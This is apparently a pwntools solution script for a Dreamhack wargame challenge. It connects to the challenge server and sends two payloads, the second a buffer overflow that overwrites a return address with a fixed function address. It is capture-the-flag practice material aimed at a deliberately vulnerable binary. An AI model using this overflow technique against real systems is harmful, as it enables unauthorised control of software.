#!/usr/local/bin/python3
from pwn import *

context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./chall")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host" + str(HOST) + ".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


flag = p64(0x4012BC)
payload1 = b"cherry" + b"A" * 0x6 + p32(34)
payload2 = b"B" * 0x1A + flag

pause()
p.recvuntil(": ")
p.send(payload1)
p.recvuntil(": ")
p.send(payload2)
p.interactive()

# To send bytes: p.sendline(p64(payload))
# To send numbers: p.sendline(str(payload)) <- i.e.) payload = 0xFFFFFFFF
